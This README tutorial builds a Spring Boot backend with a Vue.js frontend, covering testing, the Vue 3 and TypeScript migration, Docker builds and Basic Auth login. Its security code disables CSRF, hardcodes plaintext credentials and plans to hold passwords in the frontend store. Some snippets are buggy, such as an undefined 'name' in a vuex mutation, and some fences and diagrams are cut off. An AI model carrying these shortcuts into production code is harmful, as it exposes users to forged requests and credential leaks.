Nightwatch is configured through the [nightwatch.conf.js](/frontend/test/e2e/nightwatch.conf.js). Watch out for breaking changes in 1.x: https://github.com/nightwatchjs/nightwatch/wiki/Migrating-to-Nightwatch-1.0

More options could be found in the docs: http://nightwatchjs.org/gettingstarted/#settings-file


#### Write Nightwatch tests

An example Nightwatch test is provided in [HelloAcceptance.test.js](/frontend/test/e2e/specs/HelloAcceptance.test.js):

```js
module.exports = {
    'default e2e tests': browser => {
        browser
            .url(process.env.VUE_DEV_SERVER_URL)
            .waitForElementVisible('#app', 5000)
            .assert.elementPresent('.hello')
            .assert.containsText('h1', 'Welcome to your Vue.js powered Spring Boot App')
            .assert.elementCount('img', 1)
            .end()
    }
}
```

##### Run E2E Tests

`npm run test:e2e`


## Run all tests

 `npm test`



## NPM Security

npm Security - npm@6

## Shift from templates to plugin-based architecture in Vue Cli 3

In the long run, templates like the main [webpack](https://github.com/vuejs-templates/webpack) are deprecated in the Vue.js universe:

https://vuejsdevelopers.com/2018/03/26/vue-cli-3/

Plugins bring the following benefits compared to templates:

* No lock in, as plugins can be added at any point in the development lifecycle
* Zero config plugins allow you to spend time developing rather than configuring
* Easy to upgrade, as configuration can be customized without “ejecting”
* Allows developers to make their own plugins and presets

Starting point: https://cli.vuejs.org/


#### OMG! My package.json is so small - Vue CLI 3 Plugins

From https://cli.vuejs.org/guide/plugins-and-presets.html:

> Vue CLI uses a plugin-based architecture. If you inspect a newly created project's package.json, you will find dependencies that start with `@vue/cli-plugin-`. Plugins can modify the internal webpack configuration and inject commands to `vue-cli-service`. Most of the features listed during the project creation process are implemented as plugins.

With plugings, extensions to an existing project could also be made via: `vue add pluginName`. E.g. if you want to add Nightwatch E2E tests to your project, just run `vue add @vue/e2e-nightwatch`. All scoped packages are available here: https://github.com/vuejs/vue-cli/tree/dev/packages/%40vue

These new Vue CLI 3 plugin architecture cleans our big `package.json` to a really neat compact thing. This was the old big dependency block:

````json
  ""devDependencies"": {
    ""@vue/test-utils"": ""^1.0.0-beta.25"",
    ""autoprefixer"": ""^7.1.2"",
    ""babel-core"": ""^6.26.3"",

    ""postcss-loader"": ""^2.1.6"",
    ""postcss-url"": ""^7.2.1"",

    ""vue-jest"": ""^1.0.2"",
    ""vue-loader"": ""^13.7.3"",
    ""vue-style-loader"": ""^3.0.1"",
    ""vue-template-compiler"": ""^2.5.17"",
    ""webpack"": ""^3.6.0"",
    ""webpack-bundle-analyzer"": ""^2.13.1"",
    ""webpack-dev-server"": ""^2.11.3"",
    ""webpack-merge"": ""^4.1.4""
  },
````

As you can see, we´re not only maintaining our high-level libraries of choice like nightwatch, jest and so on. We´re also maintaining libraries that they use itself. Now this is over with Vue CLI 3. Let´s have a look at the super clean dependency block now:

```json
""devDependencies"": {
    ""@vue/cli-plugin-babel"": ""^3.0.3"",
    ""@vue/cli-plugin-e2e-nightwatch"": ""^3.0.3"",
    ""@vue/cli-plugin-unit-jest"": ""^3.0.3"",
    ""@vue/cli-service"": ""^3.0.3"",
    ""@vue/test-utils"": ""^1.0.0-beta.20"",
    ""babel-core"": ""7.0.0-bridge.0"",
    ""babel-jest"": ""^23.0.1"",
    ""node-sass"": ""^4.9.0"",
    ""sass-loader"": ""^7.0.1"",
    ""vue-template-compiler"": ""^2.5.17""
  },
``` 

As you dig into the directories like `node_modules/@vue/cli-plugin-e2e-nightwatch`, you´ll find where the used libraries of nightwatch are configured - in the respective `package.json` there:

```json
  ""dependencies"": {
    ""@vue/cli-shared-utils"": ""^3.0.2"",
    ""chromedriver"": ""^2.40.0"",
    ""deepmerge"": ""^2.1.1"",
    ""execa"": ""^0.10.0"",
    ""nightwatch"": ""^0.9.21"",
    ""selenium-server"": ""^3.13.0""
  },
```

This is really cool, I have to admit!


#### The vue.config.js file

Vue CLI 3 removes the need for explicit configuration files - and thus you wont find any `build` or `config` directories in your projects root any more. This now implements a ""convention over configuration"" approach, which makes it much easier to kick-start a Vue.js project, as it provides widly used defaults to webpack etc. It also eases the upgradeability of Vue.js projects - or even makes it possible. 

__But__: How do we configure webpack etc. for CORS handling, the build directories and so on? This could be done with the optional [vue.config.js](https://cli.vuejs.org/config/#vue-config-js):

```javascript
module.exports = {
  // proxy all webpack dev-server requests starting with /api
  // to our Spring Boot backend (localhost:8098) using http-proxy-middleware
  // see https://cli.vuejs.org/config/#devserver-proxy
  devServer: {
    proxy: {
      '/api': {
        target: 'http://localhost:8098',
        ws: true,
        changeOrigin: true
      }
    }
  },
  // Change build paths to make them Maven compatible
  // see https://cli.vuejs.org/config/
  outputDir: 'target/dist'
}
```

#### Updating Vue in an existing project

Update your local `@vue/cli` to the latest version:

```
npm install -g @vue/cli
```

Then update Vue.js and all your other JS dependencies with:

```
cd frontend
npm update
```


## Upgrade to Vue.js 3.x/4.x next

Let's move from 2.6.x -> 3.x/4.x next here.

> Be aware that [the latest version of vue currently is `2.6.x` and `3.x` is considered `next`](https://www.npmjs.com/package/vue)!

There are some resources:

https://v3.vuejs.org/guide/migration/introduction.html#quickstart

https://johnpapa.net/vue2-to-vue3/

And if we are using 3.x, we can even migrate to 4.x: https://cli.vuejs.org/migrating-from-v3/


#### Upgrade from 2.x to 3.x

There's a migration tooling, simply use:

```shell
vue add vue-next
```

This took around 3 minutes or more on my MacBook and changed some files:

![vue-js-2.x-to-3.x-next-upgrade](screenshots/vue-js-2.x-to-3.x-next-upgrade.png)

The [package.json](frontend/package.json) got some new or upgraded deps:

![vue-js-2.x-to-3.x-next-upgrade-dependencies](screenshots/vue-js-2.x-to-3.x-next-upgrade-dependencies.png)

[As John stated in his post](https://johnpapa.net/vue2-to-vue3/) it's strange to find `beta` versions with `vue`, `vue-router` and `vuex`. 

So in order to see what a fresh skeleton would produce, let's also create one in another dir ([I assume you have `npm install -g @vue/cli` installed](https://v3.vuejs.org/guide/migration/introduction.html#quickstart):

```shell
mkdir vue3test && cd vue3test
vue create hello-vue3
```

I aligned my project to match the latest skeleton generation much better: So router, store and api got their own directories. The views are now in the correct folder `views` - and I extracted one component to use from the newly introduced `Home.vue` view: the `HelloSpringWorld.vue` component.

I also went over the [package.json](frontend/package.json) and upgraded to the latest release versions instead of alphas (except `@vue/test-utils` which only has a `rc` atm).

All imports were refactored too. Coming from this style:

```javascript
import Vue from 'vue'
import Router from 'vue-router'
```

everything now reads:

```javascript
import { createApp } from 'vue';
import { createRouter, createWebHistory } from 'vue-router'
```

Also check your `router.js` or [router/index.js](frontend/src/router/index.js)! Using a path redirect like this leads to a non working routing configuration:

```javascript
    // otherwise redirect to home
    { path: '*', redirect: '/' }
```

The error in the Browser console states:

```shell
Uncaught Error: Catch all routes (""*"") must now be defined using a param with a custom regexp.
See more at https://next.router.vuejs.org/guide/migration/#removed-star-or-catch-all-routes.
```

I changed it to the new param with regex syntax like this:

```javascript
    // otherwise redirect to home
    { path: '/:pathMatch(.*)*', redirect: '/' }
```

A crucial point to get jest to work again, was to add the following to the [jest.config.js](frontend/jest.config.js):

```javascript
  transform: {
    '^.+\\.vue$': 'vue-jest'
  }
```

Otherwise my tests ran into the following error:

```shell
npm run test:unit

> frontend@4.0.0 test:unit
> vue-cli-service test:unit --coverage

 FAIL  tests/unit/views/User.spec.js
  ● Test suite failed to run

    Vue packages version mismatch:

    - vue@3.0.11 (/Users/jonashecht/dev/spring-boot/spring-boot-vuejs/frontend/node_modules/vue/index.js)
    - vue-template-compiler@2.6.12 (/Users/jonashecht/dev/spring-boot/spring-boot-vuejs/frontend/node_modules/vue-template-compiler/package.json)

    This may cause things to work incorrectly. Make sure to use the same version for both.
    If you are using vue-loader@>=10.0, simply update vue-template-compiler.
    If you are using vue-loader@<10.0 or vueify, re-installing vue-loader/vueify should bump vue-template-compiler to the latest.

      at Object.<anonymous> (node_modules/vue-template-compiler/index.js:10:9)
```

Luckily this so answer helped me out: https://stackoverflow.com/a/65111966/4964553

And finally Bootstrap Vue doesn't support Vue 3.x right now: https://github.com/bootstrap-vue/bootstrap-vue/issues/5196 - So I temporarily commented out the imports.


#### Add TypeScript

Vue 3.x is now build with TypeScript: https://v3.vuejs.org/guide/typescript-support.html

> A static type system can help prevent many potential runtime errors as applications grow, which is why Vue 3 is written in TypeScript. This means you don't need any additional tooling to use TypeScript with Vue - it has first-class citizen support.

There's also a huge documentation of TypeScript itself at https://www.typescriptlang.org/docs/ I can also recommend https://medium.com/js-dojo/adding-typescript-to-your-existing-vuejs-2-6-app-aaa896c2d40a

To migrate your project there's the command:

```shell
vue add typescript
```

The first question arises: `Use class-style component syntax? (Y/n)` whether to use class-style component syntax or not. I didn't use it. I think the interface definitions of components are concise enough without the class-style. But let's see how this will work out.

So this was the output:

```shell
vue add typescript
 WARN  There are uncommitted changes in the current repository, it's recommended to commit or stash them first.
? Still proceed? Yes

```

Now I went through all the componentes and views and extended `<script>` to `<script lang=""ts"">`.

Also I changed

```javascript
  export default {
```

to

```javascript
import { defineComponent } from 'vue';

export default defineComponent({
```

Now we need to transform our JavaScript code into TypeScript.

A really good introduction could be found here: https://www.vuemastery.com/blog/getting-started-with-typescript-and-vuejs/

> This process will take a while, depending on your code - and mainly on your knowledge about TypeScript. But I think it's a great path to go!

Don't forget to deactivate source control for `.js` and `.map` files in `src`, because these will now be generated (aka transpiled) from TypeScript and [shouldn't be checked in (anymore)](https://stackoverflow.com/a/26464907/4964553).

I enhanced my [frontend/.gitignore](frontend/.gitignore) like this:

```shell
# TypeScript
*.map
src/*.js
test/*.js
```

##### Vuex Store with TypeScript

According to https://next.vuex.vuejs.org/guide/typescript-support.html#typing-store-property-in-vue-component in order to use vuex store with TypeScript, we:

> must declare your own module augmentation.

TLDR; we need to create a file [src/vuex.d.ts](frontend/src/vuex.d.ts):

```javascript
import { ComponentCustomProperties } from 'vue'
import { Store } from 'vuex'

declare module '@vue/runtime-core' {
  // declare your own store states
  interface State {
    count: number
  }

  // provide typings for `this.$store`
  interface ComponentCustomProperties {
    $store: Store<State>
  }
}
```


#### Bootstrap support for Vue.js 3/Next

Our View [Bootstrap.vue](frontend/src/views/Bootstrap.vue) is based on the library `bootstrap-vue`, which brings in some nice Bootstrap CSS stylings & components.

But bootstrap-vue isn't compatible with Vue.js 3/Next: https://github.com/bootstrap-vue/bootstrap-vue/issues/5196 and it's unclear, when it's going to support it - or even if at all.

With the upgrade to Vue.js 3.x our `bootstrap-vue` based component view stopped working.

There's also another change: [Bootstrap 5.x is here to be the next evolutionary step - and it even dropped the need for JQuery](https://blog.getbootstrap.com/2020/06/16/bootstrap-5-alpha/).

But also Bootstrap 5.x isn't supported by `bootstrap-vue` right now. So let's try to use Bootstrap without it?!

Therefore install bootstrap next (which - as like Vue.js - stands for the new version 5):

```shell
npm i bootstrap@next
npm i @popperjs/core
```

Since Bootstrap 5 depends on `popperjs` for tooltips (see https://getbootstrap.com/docs/5.0/getting-started/introduction/#js), we also need to include it.

We can remove `""bootstrap-vue"": ""2.21.2""` and `""jquery"": ""3.6.0"",` from our `package.json`.

We also need to import Bootstrap inside our [main.ts](frontend/src/main.ts):

```javascript
import ""bootstrap/dist/css/bootstrap.min.css"";
import ""bootstrap"";
```

Let's try to use Bootstrap 5 inside our [Bootstrap.vue](frontend/src/views/Bootstrap.vue).

And also inside the `Login.vue` and the `Protected.vue`. Using Bootstrap 5.x components without `bootstrap-vue` seems to be no problem (see docs how to use here: https://getbootstrap.com/docs/5.0/components/badge/).


## Build and run with Docker

In the issue [jonashackt/spring-boot-vuejs/issues/25](https://github.com/jonashackt/spring-boot-vuejs/issues/25) the question on how to build and run our spring-boot-vuejs app with Docker. 

As already stated in the issue there are multiple ways of doing this. One I want to outline here is a more in-depth variant, where you'll know exacltly what's going on behind the scenes.

First we'll make use of [Docker's multi-stage build feature](https://docs.docker.com/develop/develop-images/multistage-build/) - in __the first stage__ we'll build our Spring Boot Vue.js app using our established Maven build process. Let's have a look into our [Dockerfile](Dockerfile):

```dockerfile
# Docker multi-stage build

# 1. Building the App with Maven
FROM maven:3-jdk-11

ADD . /springbootvuejs
WORKDIR /springbootvuejs

# Just echo so we can see, if everything is there :)
RUN ls -l

# Run Maven build
RUN mvn clean install
```

A crucial part here is to add all necessary files into our Docker build context - but leaving out the underlying OS specific node libraries! As not leaving them out would lead [to errors like](https://stackoverflow.com/questions/37986800/node-sass-could-not-find-a-binding-for-your-current-environment?page=1&tab=active#tab-top):

```
Node Sass could not find a binding for your current environment: Linux 64-bit with Node.js 11.x
```

Therefore we create a [.dockerignore](.dockerignore) file and leave out the directories `frontend/node_modules` & `frontend/node` completely using the `frontend/node*` configuration:

```
# exclude underlying OS specific node modules
frontend/node*

# also leave out pre-build output folders
frontend/target
backend/target
```

We also ignore the pre-build output directories.

In __the second stage__ of our [Dockerfile](Dockerfile) we use the build output of the first stage and prepare everything to run our Spring Boot powered Vue.js app later:

```dockerfile
# Just using the build artifact and then removing the build-container
FROM openjdk:11-jdk

MAINTAINER Jonas Hecht

VOLUME /tmp

# Add Spring Boot app.jar to Container
COPY --from=0 ""/springbootvuejs/backend/target/backend-0.0.1-SNAPSHOT.jar"" app.jar

ENV JAVA_OPTS=""""

# Fire up our Spring Boot app by default
ENTRYPOINT [ ""sh"", ""-c"", ""java $JAVA_OPTS -Djava.security.egd=file:/dev/./urandom -jar /app.jar"" ]
```

Now we should everything prepared to run our Docker build:

```
docker build . --tag spring-boot-vuejs:latest
```

This build can take a while, since all Maven and NPM dependencies need to be downloaded for the build.

When the build is finished, simply start a Docker container based on the newly build image and prepare the correct port to be bound to the Docker host for easier access later:

```
docker run -d -p 8098:8098 --name myspringvuejs spring-boot-vuejs
```

Have a look into your running Docker containers with `docker ps` and you should see the new container:

```
$ docker ps
CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS                    NAMES
745e854d7781        spring-boot-vuejs   ""sh -c 'java $JAVA_O…""   12 seconds ago      Up 11 seconds       0.0.0.0:8098->8098/tcp   myspringvuejs
```

If you want to see the typical Spring Boot startup logs, just use `docker logs 745e854d7781 --follow`:

```
$ docker logs 745e854d7781 --follow

Now access your Dockerized Spring Boot powererd Vue.js app inside your Browser at [http://localhost:8098](http://localhost:8098). 

If you have played enough with your Dockerized app, don't forget to stop (`docker stop 745e854d7781`) and remove (`docker rm 745e854d7781`) it in the end.


#### Autorelease to Docker Hub on hub.docker.com

We also want to have the current version of our code build and released to https://hub.docker.com/. Therefore head to the repositories tab in Docker Hub and click `Create Repository`:

![docker-hub-create-repo](screenshots/docker-hub-create-repo.png)

As the docs state, there are some config options to [setup automated builds](https://docs.docker.com/docker-hub/builds/).

Finally, we should see our Docker images released on https://hub.docker.com/r/jonashackt/spring-boot-vuejs and could run this app simply by executing:

```
docker run -p 8098:8098 jonashackt/spring-boot-vuejs:latest
```

This pulls the latest `jonashackt/spring-boot-vuejs` image and runs our app locally:

```
docker run -p 8098:8098 jonashackt/spring-boot-vuejs:latest

Now head over to [http://localhost:8098/](http://localhost:8098/) and see the app live :)


# Run with JDK 8, 9 or 11 ff

As with Spring Boot, we can define the desired Java version simply by editing our backend's [pom.xml](backend/pom.xml): 

```
	<properties>
		<java.version>1.8</java.version>
	</properties>
```

If you want to have `JDK9`, place a `<java.version>9</java.version>` or other versions just as you like to (see [this stackoverflow answer](https://stackoverflow.com/questions/54467287/how-to-specify-java-11-version-in-spring-spring-boot-pom-xml)).

Spring Boot handles the needed `maven.compiler.release`, which tell's Java from version 9 on to build for a specific target.

We just set `1.8` as the baseline here, since if we set a newer version as the standard, builds on older versions then 8 will fail (see [this build log for example](https://travis-ci.org/jonashackt/spring-boot-vuejs/builds/547227298).

Additionally, we use GitHub Actions to run the Maven build on some mayor Java versions - have a look into the [build.yml](.github/workflows/build.yml) workflow:

```yaml
jobs:
  build:
    runs-on: ubuntu-latest

    strategy:
      matrix:
        java-version: [ 8, 11, 15 ]
```


# Secure Spring Boot backend and protect Vue.js frontend

Securing parts of our application must consist of two parts: securing the Spring Boot backend - and reacting on that secured backend in the Vue.js frontend.

## Secure the backend API with Spring Security

https://spring.io/guides/tutorials/spring-boot-oauth2

https://spring.io/guides/gs/securing-web/

https://www.baeldung.com/rest-assured-authentication

Now let's focus on securing our Spring Boot backend first! Therefore we introduce a new RESTful resource, that we want to secure specifically:


                   +---+                  +---+                  +---+
                   |   | /api/hello       |   | /api/user        |   | /api/secured
                   +---+                  +---+                  +---+
                     |                      |                      |
        +-----------------------------------------------------------------------+
        |                                                                       |
        |                                                                       |
        |                                                                       |
        |                                                                       |
        |                                                                       |
        |  Spring Boot backend                                                  |
        |                                                                       |
        +-----------------------------------------------------------------------+


#### Configure Spring Security

First we add a new REST resource `/secured` inside our `BackendController we want to secure - and use in a separate frontend later:

```
    @GetMapping(path=""/secured"")
    public @ResponseBody String getSecured() {
        LOG.info(""GET successfully called on /secured resource"");
        return SECURED_TEXT;
    }
```

With Spring it is relatively easy to secure our API. Let's add `spring-boot-starter-security` to our [pom.xml](backend/pom.xml):

```xml
		<!-- Secure backend API -->
		<dependency>
			<groupId>org.springframework.boot</groupId>
			<artifactId>spring-boot-starter-security</artifactId>
		</dependency>

		<dependency>
			<groupId>org.springframework.security</groupId>
			<artifactId>spring-security-test</artifactId>
			<scope>test</scope>
		</dependency>
```

Also create a new @Configuration annotated class called [WebSecurityConfiguration.class](backend/src/main/java/de/jonashackt/springbootvuejs/configuration/WebSecurityConfiguration.java):

```java
package de.jonashackt.springbootvuejs.configuration;

import org.springframework.context.annotation.Configuration;
import org.springframework.security.config.annotation.authentication.builders.AuthenticationManagerBuilder;
import org.springframework.security.config.annotation.web.builders.HttpSecurity;
import org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;
import org.springframework.security.config.annotation.web.configuration.WebSecurityConfigurerAdapter;
import org.springframework.security.config.http.SessionCreationPolicy;

@Configuration
@EnableWebSecurity
public class WebSecurityConfiguration extends WebSecurityConfigurerAdapter {

    @Override
    protected void configure(HttpSecurity http) throws Exception {

        http
            .sessionManagement().sessionCreationPolicy(SessionCreationPolicy.STATELESS) // No session will be created or used by spring security
        .and()
            .httpBasic()
        .and()
            .authorizeRequests()
                .antMatchers(""/api/hello"").permitAll()
                .antMatchers(""/api/user/**"").permitAll() // allow every URI, that begins with '/api/user/'
                .antMatchers(""/api/secured"").authenticated()
                .anyRequest().authenticated() // protect all other requests
        .and()
            .csrf().disable(); // disable cross site request forgery, as we don't use cookies - otherwise ALL PUT, POST, DELETE will get HTTP 403!
    }

    @Override
    protected void configure(AuthenticationManagerBuilder auth) throws Exception {
        auth.inMemoryAuthentication()
                .withUser(""foo"").password(""{noop}bar"").roles(""USER"");
    }
}

```

Using a simple `http.httpBasic()` we configure to provide a Basic Authentication for our secured resources.

To deep dive into the Matcher configurations, have a look into https://docs.spring.io/spring-security/site/docs/current/reference/htmlsingle/#jc-authorize-requests

#### Be aware of CSRF!

__BUT:__ Be aware of the CSRF (cross site request forgery) part! The defaults will render a [HTTP 403 FORBIDDEN for any HTTP verb that modifies state (PATCH, POST, PUT, DELETE)](https://docs.spring.io/spring-security/site/docs/current/reference/htmlsingle/#csrf-configure):

> by default Spring Security’s CSRF protection will produce an HTTP 403 access denied.

For now we can disable the default behavior with `http.csrf().disable()`


#### Testing the secured Backend

See https://www.baeldung.com/rest-assured-authentication

Inside our [BackendControllerTest](backend/src/test/java/de/jonashackt/springbootvuejs/controller/BackendControllerTest.java) we should check, whether our API reacts with correct HTTP 401 UNAUTHORIZED, when called without our User credentials:

```
	@Test
	public void secured_api_should_react_with_unauthorized_per_default() {

		given()
		.when()
			.get(""/api/secured"")
		.then()
			.statusCode(HttpStatus.SC_UNAUTHORIZED);
	}
```

Using `rest-assured` we can also test, if one could access the API correctly with the credentials included:

```
	@Test
	public void secured_api_should_give_http_200_when_authorized() {

		given()
			.auth().basic(""foo"", ""bar"")
		.when()
			.get(""/api/secured"")
		.then()
			.statusCode(HttpStatus.SC_OK)
			.assertThat()
				.body(is(equalTo(BackendController.SECURED_TEXT)));
	}
```

The crucial point here is to use the `given().auth().basic(""foo"", ""bar"")` configuration to inject the correct credentials properly.



#### Configure credentials inside application.properties and environment variables

Defining the users (and passwords) inside code (like our [WebSecurityConfiguration.class](backend/src/main/java/de/jonashackt/springbootvuejs/configuration/WebSecurityConfiguration.java)) that should be given access to our application is a test-only practice!

For our super simple example application, we could have a solution quite similar - but much more safe: If we would be able to extract this code into configuration and later use Spring's powerful mechanism of overriding these configuration with environment variables, we could then store them safely inside our deployment pipelines settings, that are again secured by another login - e.g. as Heroku Config Vars.

Therefore the first step would be to delete the following code:

```
@Override
    protected void configure(AuthenticationManagerBuilder auth) throws Exception {
        auth.inMemoryAuthentication()
                .withUser(""foo"").password(""{noop}bar"").roles(""USER"");
    }
```

and add the following configuration to our [application.properties](backend/src/main/resources/application.properties):

```
spring.security.user.name=sina
spring.security.user.password=miller
```

Running our tests using the old credentials should fail now. Providing the newer one, the test should go green again.

Now introducing environment variables to the game could also be done locally inside our IDE for example. First change the test `secured_api_should_give_http_200_when_authorized` again and choose some new credentials like user `maik` with pw `meyer`.

Don't change the `application.properties` right now - use your IDE's run configuration and insert two environment variables:

```
SPRING_SECURITY_USER_NAME=maik
SPRING_SECURITY_USER_PASSWORD=meyer
```

Now the test should run green again with this new values.


## Protect parts of Vue.js frontend

Now that we have secured a specific part of our backend API, let's also secure a part of our Vue.js frontend:

        +-----------------------------------------------------------------------+
        |  Vue.js frontend                                                      |

        |                                                                       |
        +-----------------------------------------------------------------------+

        +-----------------------------------------------------------------------+
        |                                                                       |

#### Create a new Vue Login component

As there is already a secured Backend API, we also want to have a secured frontend part. 

Every solution you find on the net seems to be quite overengineered for the ""super-small-we-have-to-ship-today-app"". Why should we bother with a frontend auth store like vuex at the beginning? Why start with OAuth right up front? These could be easily added later on!

The simplest solution one could think about how to secure our frontend, would be to create a simple Login.vue component, that simply accesses the `/api/secured` resource every time the login is used.

Therefore we use [Vue.js conditionals](https://vuejs.org/v2/guide/conditional.html) to show something on our new [Login.vue](frontend/src/components/Login.vue):

```
<template>
  <div class=""protected"" v-if=""loginSuccess"">
    <h1><b-badge variant=""success"">Access to protected site granted!</b-badge></h1>
    <h5>If you're able to read this, you've successfully logged in.</h5>
  </div>
  <div class=""unprotected"" v-else-if=""loginError"">
    <h1><b-badge variant=""danger"">You don't have rights here, mate :D</b-badge></h1>
    <h5>Seams that you don't have access rights... </h5>
  </div>
  <div class=""unprotected"" v-else>
    <h1><b-badge variant=""info"">Please login to get access!</b-badge></h1>
    <h5>You're not logged in - so you don't see much here. Try to log in:</h5>

    <form @submit.prevent=""callLogin()"">
      <input type=""text"" placeholder=""username"" v-model=""user"">
      <input type=""password"" placeholder=""password"" v-model=""password"">
      <b-btn variant=""success"" type=""submit"">Login</b-btn>
      <p v-if=""error"" class=""error"">Bad login information</p>
    </form>
  </div>

</template>

<script>
import api from './backend-api'

export default {
  name: 'login',

  data () {
    return {
      loginSuccess: false,
      loginError: false,
      user: '',
      password: '',
      error: false
    }
  }
}

</script>
``` 

For now the conditional is only handled by two boolean values: `loginSuccess` and `loginError`.

To bring those to life, we implement the `callLogin()` method:

```
,
  methods: {
    callLogin() {
      api.getSecured(this.user, this.password).then(response => {
        console.log(""Response: '"" + response.data + ""' with Statuscode "" + response.status)
        if(response.status == 200) {
          this.loginSuccess = true
        }
      }).catch(error => {
        console.log(""Error: "" + error)
        this.loginError = true
      })
    }
  }
```

With this simple implementation, the Login component asks the Spring Boot backend, if a user is allowed to access the `/api/secured` resource. The [backend-api.js](frontend/src/components/backend-api.js) provides an method, which uses axios' Basic Auth feature:

```
    getSecured(user, password) {
        return AXIOS.get(`/secured/`,{
            auth: {
                username: user,
                password: password
            }});
    }
``` 

Now the Login component works for the first time:

![secure-spring-vue-simple-login](screenshots/secure-spring-vue-simple-login.gif)




#### Protect multiple Vue.js components

Now we have a working Login component. Now let's create a new `Protected.vue` component, since we want to have something that's only accessible, if somebody has logged in correctly:

```
<template>
  <div class=""protected"" v-if=""loginSuccess"">
    <h1><b-badge variant=""success"">Access to protected site granted!</b-badge></h1>
    <h5>If you're able to read this, you've successfully logged in.</h5>
  </div>
  <div class=""unprotected"" v-else>
    <h1><b-badge variant=""info"">Please login to get access!</b-badge></h1>
    <h5>You're not logged in - so you don't see much here. Try to log in:</h5>
    <router-link :to=""{ name: 'Login' }"" exact target=""_blank"">Login</router-link>
  </div>

</template>

<script>
import api from './backend-api'

export default {
  name: 'protected',

  data () {
    return {
      loginSuccess: false,
      error: false
    }
  },
  methods: {
    //
  }
}

</script>
```

This component should only be visible, if the appropriate access was granted at the Login. Therefore we need to solve 2 problems:

* __Store the login state__
* __Redirect user from Protected.vue to Login.vue, if not authenticated before__



#### Store login information with vuex

The super dooper simple solution would be to simply use `LocalStorage`. But with [vuex](https://github.com/vuejs/vuex) there is a centralized state management in Vue.js, which is pretty popular. So we should invest some time to get familiar with it. There's a full guide available: https://vuex.vuejs.org/guide/ and a great introductory blog post here: https://pusher.com/tutorials/authentication-vue-vuex

You could also initialize a new Vue.js project with Vue CLI and mark the `vuex` checkbox. But we try to extend the current project here.

First we add [the vuex dependency](https://www.npmjs.com/package/vuex) into our [package.json](frontend/package.json):

```
...
    ""vue"": ""^2.6.10"",
    ""vue-router"": ""^3.0.6"",
    ""vuex"": ""^3.1.1""
  },
```

> There are four things that go into a Vuex module: the initial [state](https://vuex.vuejs.org/guide/state.html), [getters](https://vuex.vuejs.org/guide/getters.html), [mutations](https://vuex.vuejs.org/guide/mutations.html) and [actions](https://vuex.vuejs.org/guide/actions.html)

#### Define the vuex state

To implement them, we create a new [store.js](frontend/src/store.js) file:

```
import Vue from 'vue'
import Vuex from 'vuex'

Vue.use(Vuex)

export default new Vuex.Store({
    state: {
        loginSuccess: false,
        loginError: false,
        userName: null
    },
  mutations: {

  },
  actions: {

  },
  getters: {
  
  }
})

``` 

We only have an initial state here, which is that a login could be successful or not - and there should be a `userName`.


#### Define a vuex action login() and the mutations login_success & login_error

Then we have a look onto __vuex actions: They provide a way to commit mutations to the vuex store.__ 

As our app here is super simple, we only have one action to implement here: `login`. We omit the `logout` and `register` actions, because we only define one admin user in the Spring Boot backend right now and don't need an implemented logout right now. Both could be implemented later!

We just shift our logic on how to login a user from the `Login.vue` to our vuex action method:

```
    mutations: {
        login_success(state, name){
            state.loginSuccess = true
            state.userName = name

        },
        login_error(state){
            state.loginError = true
            state.userName = name
        }
    },
    actions: {
        async login({commit}, user, password) {
            api.getSecured(user, password)
                .then(response => {
                    console.log(""Response: '"" + response.data + ""' with Statuscode "" + response.status);
                    if(response.status == 200) {
                        // place the loginSuccess state into our vuex store
                        return commit('login_success', name);
                    }
                }).catch(error => {
                    console.log(""Error: "" + error);
                    // place the loginError state into our vuex store
                    commit('login_error', name);
                    return Promise.reject(""Invald credentials!"")
                })
        }
    },
```

Instead of directly setting a boolean to a variable, we `commit` a mutation to our store if the authentication request was successful or unsuccessful. We therefore implement two simple mutations: `login_success` & `login_error`


#### Last but not least: define getters for the vuex state

To be able to access vuex state from within other components, we need to implement getters inside our vuex store. As we only want some simple info, we need the following getters:

```
    getters: {
        isLoggedIn: state => state.loginSuccess,
        hasLoginErrored: state => state.loginError
    }
```

#### Use vuex Store inside the Login component and forward to Protected.vue, if Login succeeded

Instead of directly calling the auth endpoint via axios inside our Login component, we now want to use our vuex store and its actions instead. Therefore we don't even need to import the [store.js](frontend/src/store.js) inside our `Login.vue`, we can simply access it through `$store`. Thy is that? Because we already did that inside our [main.js](frontend/src/main.js):

```
import store from './store'

...

new Vue({
    router,
    store,
    render: h => h(App)
}).$mount('#app')
```

With that configuration `store` and `router` are accessible from within every Vue component with the `$` prefixed :) 

If we have a look into our `Login.vue` we see that in action:

```
callLogin() {
      this.$store.dispatch('login', { user: this.user, password: this.password})
        .then(() => this.$router.push('/Protected'))
        .catch(error => {
          this.error.push(error)
        })
    }
```

Here we access our vuex store action `login` and issue a login request to our Spring Boot backend. If this succeeds, we use the Vue `$router` to forward the user to our `Protected.vue` component.


#### Redirect user from Protected.vue to Login.vue, if not authenticated before

Now let's enhance our [router.js](frontend/src/router.js) slightly. We use the Vue.js routers' [meta field](https://router.vuejs.org/guide/advanced/meta.html) feature to check, whether a user is loggin in already and therefore should be able to access our Protected component with the URI `/protected` :

```
    {
        path: '/protected',
        component: Protected,
        meta: { 
            requiresAuth: true 
        }
    },
``` 

We also add a new behavior to our router, that checks if it requires authentication every time a route is accessed. If so, it will redirect to our Login component:

```
router.beforeEach((to, from, next) => {
    if (to.matched.some(record => record.meta.requiresAuth)) {
        // this route requires auth, check if logged in
        // if not, redirect to login page.
        if (!store.getters.isLoggedIn) {
            next({
                path: '/login'
            })
        } else {
            next();
        }
    } else {
        next(); // make sure to always call next()!
    }
});
```

Now if one clicks onto `Protected` and didn't login prior, our application redirects to `Login` automatically:

![secure-spring-redirect-to-login](screenshots/secure-spring-redirect-to-login.gif)

With this redirect, we also don't need the part with `<div class=""protected"" v-if=""loginSuccess"">` inside our Login.vue, since in case of a successful login, the user is directly redirected to the Protected.vue.


## Check auth state at secured backend endpoints

We're now already where we wanted to be at the first place: Our Spring Boot backend has a secured API endpoint, which works with simple user/password authentication. And our Vue.js frontend uses this endpoint to do a Login and protect the `Protected` component, if the user didn't log in before. The login state is held in the frontend, using the `vuex` store.

Now if we want to go a step ahead and call a secured API endpoint in the backend from within our `Protected` frontend component, we need to fully store the credentials inside our `vuex` store, so we could access our secured resource

        |                                                                       |
        |                                                                       |
        |                                                                       |
        |                                                                       |
        |                                                                       |
        |  Spring Boot backend                                                  |
        +-----------------------------------------------------------------------+

Therefore we enhance our [store.js](frontend/src/store.js):

```
export default new Vuex.Store({
    state: {
        loginSuccess: false,
        loginError: false,
        userName: null,
        userPass: null,
        response: []
    },
